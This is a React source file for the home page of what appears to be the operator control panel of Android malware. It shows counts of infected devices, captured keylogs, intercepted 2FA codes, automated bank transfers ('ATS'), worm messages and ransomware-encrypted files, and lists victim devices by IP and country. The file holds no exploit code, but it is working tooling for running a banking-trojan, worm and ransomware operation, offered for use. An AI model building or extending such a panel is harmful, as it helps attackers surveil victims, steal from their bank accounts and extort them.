import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { dashboard } from '../utils/api'
import StatCard from '../components/StatCard'
import DataTable from '../components/DataTable'
import {
  Smartphone, Key, Bell, AlertTriangle, CreditCard, Worm, Lock,
  Activity, Zap, Globe, TrendingUp, Server
} from 'lucide-react'

export default function HomePage() {
  const [stats, setStats] = useState({})
  const [recentDevices, setRecentDevices] = useState([])
  const [threats, setThreats] = useState([])
  const navigate = useNavigate()

  useEffect(() => {
    loadData()
    const interval = setInterval(loadData, 10000)
    return () => clearInterval(interval)
  }, [])

  const loadData = async () => {
    const [s, d, t] = await Promise.all([
      dashboard.stats(),
      dashboard.recentDevices(),
      dashboard.threats()
    ])
    if (s) setStats(s)
    if (d) setRecentDevices(d)
    if (t) setThreats(t)
  }

  const deviceColumns = [
    { key: 'device_name', label: 'Device', render: (row) => (
      <div className="flex items-center gap-2">
        <div className={`w-2 h-2 rounded-full ${row.status === 'online' ? 'bg-wuzen-success animate-pulse' : 'bg-wuzen-danger'}`} />
        <span>{row.device_name || row.model || 'Unknown'}</span>
      </div>
    )},
    { key: 'model', label: 'Model' },
    { key: 'android_version', label: 'OS' },
    { key: 'ip_address', label: 'IP' },
    { key: 'country', label: 'Country' },
    { key: 'battery_level', label: 'Battery', render: (row) => (
      <span className={`${(row.battery_level || 0) < 20 ? 'text-wuzen-danger' : 'text-wuzen-success'}`}>
        {row.battery_level}%
      </span>
    )},
    { key: 'last_seen', label: 'Last Seen', render: (row) => (
      <span className="text-wuzen-muted text-xs font-mono">
        {row.last_seen ? new Date(row.last_seen).toLocaleTimeString() : 'Never'}
      </span>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <Zap className="w-6 h-6 text-wuzen-primary" />
          <div>
            <h2 className="text-xl font-bold tracking-wide">Command Dashboard</h2>
            <p className="text-xs text-wuzen-muted">Real-time device monitoring and control</p>
          </div>
        </div>
        <div className="flex items-center gap-2 text-xs text-wuzen-muted font-mono">
          <Globe className="w-3 h-3" />
          <span>GLOBAL NETWORK ACTIVE</span>
        </div>
      </div>

      {/* Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
        <StatCard title="Total Devices" value={stats.devices || 0} icon={Smartphone} color="primary" subtitle={`${stats.online || 0} online`} />
        <StatCard title="Commands Sent" value={stats.commands || 0} icon={Server} color="secondary" />
        <StatCard title="Keylogs Captured" value={stats.keylogs || 0} icon={Key} color="warning" />
        <StatCard title="Notifications" value={stats.notifications || 0} icon={Bell} color="success" />
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
        <StatCard title="2FA Pending" value={stats.tfaPending || 0} icon={AlertTriangle} color="danger" />
        <StatCard title="ATS Transfers" value={stats.atsTotal || 0} icon={CreditCard} color="secondary" />
        <StatCard title="Worm Messages" value={stats.wormTotal || 0} icon={Worm} color="warning" />
        <StatCard title="Encrypted Files" value={stats.ransomwareFiles || 0} icon={Lock} color="danger" />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Recent Devices */}
        <div className="lg:col-span-2">
          <div className="flex items-center justify-between mb-3">
            <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted">Recent Devices</h3>
            <button onClick={() => navigate('/device-info')} className="text-xs text-wuzen-primary hover:underline">
              View All
            </button>
          </div>
          <DataTable
            columns={deviceColumns}
            data={recentDevices}
            keyField="id"
            onRowClick={(row) => navigate(`/device-info/${row.device_id}`)}
          />
        </div>

        {/* Threats Panel */}
        <div>
          <div className="flex items-center justify-between mb-3">
            <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted">Active Threats</h3>
            <span className="text-xs text-wuzen-danger font-mono">{threats.length} DETECTED</span>
          </div>
          <div className="wuzen-panel p-4 space-y-3 max-h-[400px] overflow-auto">
            {threats.length === 0 ? (
              <p className="text-sm text-wuzen-muted text-center py-4">No active threats</p>
            ) : (
              threats.map((t, i) => (
                <div key={i} className="flex items-start gap-3 p-3 rounded bg-wuzen-danger/5 border border-wuzen-danger/20">
                  <AlertTriangle className="w-4 h-4 text-wuzen-danger flex-shrink-0 mt-0.5" />
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-wuzen-text truncate">{t.device_name}</p>
                    <p className="text-xs text-wuzen-danger uppercase">{t.threat_type}</p>
                    <p className="text-[10px] text-wuzen-muted font-mono mt-1">
                      {new Date(t.detected_at).toLocaleString()}
                    </p>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
